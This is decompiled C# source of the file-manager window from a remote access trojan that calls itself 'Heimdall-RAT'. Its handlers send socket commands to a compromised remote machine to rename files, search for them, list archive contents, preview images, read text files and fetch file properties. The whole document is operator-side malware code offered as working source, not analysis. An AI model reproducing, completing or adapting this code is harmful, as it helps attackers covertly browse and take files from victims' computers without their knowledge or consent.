		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					string text = Interaction.InputBox("Enter New Name", "Rename", val.get_SubItems().get_Item(0).get_Text(), -1, -1);
					if (Operators.CompareString(text, "", false) > 0)
					{
						if (listFiles.get_FocusedItem().get_ImageIndex() == 0)
						{
							MyProject.Forms.FrmMAINGR.s.Send(sock, "Rename" + MyProject.Forms.FrmMAINGR.Key + "Folder" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(text));
						}
						else
						{
							MyProject.Forms.FrmMAINGR.s.Send(sock, "Rename" + MyProject.Forms.FrmMAINGR.Key + "File" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(text));
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void En_Click(object sender, EventArgs e)
	{
		if (LocatPath.get_Text().Length > 0)
		{
			((Control)pathEntr).set_Enabled(false);
			((Control)pathRefr).set_Enabled(false);
			CDIS();
			ENPATH();
			if (!LocatPath.get_Text().EndsWith("\\"))
			{
				LocatPath.set_Text(LocatPath.get_Text() + "\\");
			}
		}
	}

	private void StartS_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (SearchPath.get_Text().Length == 0)
		{
			MessageBox.Show("You can't leave path empty!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		if (SearcFileName.get_Text().Length == 0)
		{
			MessageBox.Show("You can't leave file name empty!", "Heimdall-RAT", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		listSearchFiles.get_Items().Clear();
		MyProject.Forms.FrmMAINGR.s.Send(sock, "Search" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(SearchPath.get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(SearcFileName.get_Text()));
		((Control)SearchPath).set_Enabled(false);
		((Control)SearcFileName).set_Enabled(false);
		((Control)StartSearc).set_Enabled(false);
		((Control)listSearchFiles).set_Enabled(false);
		((ToolStripItem)ToolStripStatusLabel8).set_Text("");
		((ToolStripItem)ToolStripStatusLabel5).set_Text("Please wait a moment ...");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			((Control)SearchPath).set_Enabled(true);
			((Control)SearcFileName).set_Enabled(true);
			((Control)StartSearc).set_Enabled(true);
			listSearchFiles.get_Items().Clear();
			((Control)listSearchFiles).set_Enabled(true);
			((ToolStripItem)ToolStripStatusLabel5).set_Text("Search Cancelled Successfuly");
			((ToolStripItem)ToolStripStatusLabel8).set_Text("");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Go_Click(object sender, EventArgs e)
	{
		try
		{
			READTF();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CopyFilePathToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if ((Operators.CompareString(LocatPath.get_Text(), "", false) > 0 && Operators.CompareString(val.get_SubItems().get_Item(0).get_Text(), "...", false) != 0) ? true : false)
					{
						Clipboard.SetText(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text());
						MessageBox.Show("File Path Has Been Copied Successfuly");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FileManager_Resize(object sender, EventArgs e)
	{
		quikacc.get_Nodes().get_Item(0).ExpandAll();
		quikacc.get_Nodes().get_Item(1).ExpandAll();
	}

	private void DiscoverRarFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".zip") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ZIP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".rar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".RAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".7z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".7Z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tgz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TGZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".bz2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".BZ2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tbz2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TBZ2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gzip") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GZIP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".Z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".sit") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SIT") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".cab") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".CAB") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".lzh") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".LZH") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".pkg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PKG"))
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "RARFiles" + MyProject.Forms.FrmMAINGR.Key + Functions.Encode(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()));
			DRFGR dRFGR = new DRFGR();
			((Control)dRFGR).set_Name(((Control)this).get_Name().Replace("OpenFileManager", "DRF"));
			((Form)dRFGR).set_Text(((Form)this).get_Text().Replace("File Manager", "Discover RAR File"));
			dRFGR.sock = sock;
			dRFGR.R = RuntimeHelpers.GetObjectValue(R);
			dRFGR.RF.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text());
			((Control)dRFGR.GRF).set_Enabled(false);
			((Control)dRFGR.RF).set_Enabled(false);
			((ToolStripItem)dRFGR.ToolStripStatusLabel1).set_Text("Please wait a moment ...");
			((Control)dRFGR).Show();
		}
	}

	private void FileManager_FormClosed(object sender, FormClosedEventArgs e)
	{
		DRFGR dRFGR = (DRFGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item(((Control)this).get_Name().Replace("OpenFileManager", "DRF"));
		ThumbGR thumbGR = (ThumbGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item(((Control)this).get_Name().Replace("OpenFileManager", "TH"));
		try
		{
			((Form)dRFGR).Close();
			((Form)thumbGR).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Files_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(listFiles.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = listFiles.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			listFiles.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			listFiles.Sort();
		}
	}

	private void SearchFiles_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(listSearchFiles.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = listSearchFiles.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			listSearchFiles.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			listSearchFiles.Sort();
		}
	}

	private void ViewPhotoToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!(listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpeg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPEG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ico") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ICO") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".svg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SVG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".svgz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SVGZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".drw") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".DRW") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".psp") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PSP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PNG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".png") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".bmp") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".BMP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".DIB") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpe") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPE") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jfif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JFIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tiff") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TIFF")))
		{
			return;
		}
		try
		{
			ThumbGR thumbGR = new ThumbGR();
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item(((Control)this).get_Name().Replace("OpenFileManager", "TH")) != null)
			{
				((Form)thumbGR).Close();
			}
			MyProject.Forms.FrmMAINGR.s.Send(sock, "viewimage" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()));
			((Control)thumbGR).set_Name(((Control)this).get_Name().Replace("OpenFileManager", "TH"));
			((Form)thumbGR).set_TopMost(true);
			((Control)thumbGR).Show();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ReadTextFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listFiles.get_SelectedItems().get_Count() == 1)
		{
			if (Operators.CompareString(listFiles.get_FocusedItem().get_Text(), "...", false) == 0)
			{
				RetPa();
			}
			else if (listFiles.get_FocusedItem().get_ImageIndex() == 0)
			{
				LocatPath.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text() + "\\");
				listFiles.get_Items().Clear();
				REFLI();
			}
			else if (listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".txt") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".TXT") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".log") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".LOG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".readme") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".README") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".me") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".ME") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".cs") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".vb") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".CS") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()
				.EndsWith(".VB"))
			{
				((TabControl)EtherealTabControl1).set_SelectedIndex(4);
				reTextPath.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text());
				READTF();
			}
		}
	}

	private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (val.get_ImageIndex() == 0)
					{
						if (Operators.CompareString(val.get_SubItems().get_Item(0).get_Text(), "...", false) != 0)
						{
							MyProject.Forms.FrmMAINGR.s.Send(sock, "FPRO" + MyProject.Forms.FrmMAINGR.Key + "False" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()));
						}
					}
					else if (Operators.CompareString(val.get_SubItems().get_Item(0).get_Text(), "...", false) != 0)
					{
						MyProject.Forms.FrmMAINGR.s.Send(sock, "FPRO" + MyProject.Forms.FrmMAINGR.Key + "True" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void quikacc_AfterSelect(object sender, TreeViewEventArgs e)
	{
	}
}
